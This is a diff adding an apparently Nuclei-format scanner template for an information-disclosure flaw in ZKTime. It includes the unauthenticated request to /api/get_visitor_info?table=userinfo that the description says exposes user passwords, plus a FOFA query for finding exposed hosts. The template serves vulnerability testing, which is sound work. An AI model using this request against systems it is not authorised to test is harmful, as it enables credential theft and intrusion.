@@ -1,0 +1,31 @@
+http:
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - "\t-\t-"
+        - part: header
+          type: word
+          words:
+            - text/plain
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /api/get_visitor_info?table=userinfo HTTP/1.1
+          Host: {{Hostname}}
+id: ZkTime-get_visitor_info-Information-disclosure
+info:
+    author: Superhero
+    description: |-
+        fofa: body="/media/img/login/zktime_logo_zh-cn.png" && body="/iclock/imanager"
+        ZkTime get_visitor_info接口存在信息泄露漏洞，未经身份验证的远程攻击者可利用此漏洞获取网站系统用户密码等敏感信息，从而登录网站后台系统，使网站处于极不安全的状态。
+    name: ZkTime get_visitor_info 信息泄露漏洞
+    reference:
+        - https://mp.weixin.qq.com/s/yW6U9vZSez7CVJ89HkkLOw
+    severity: medium
+    tags:
+        - Information disclosure
+        - ZKTime
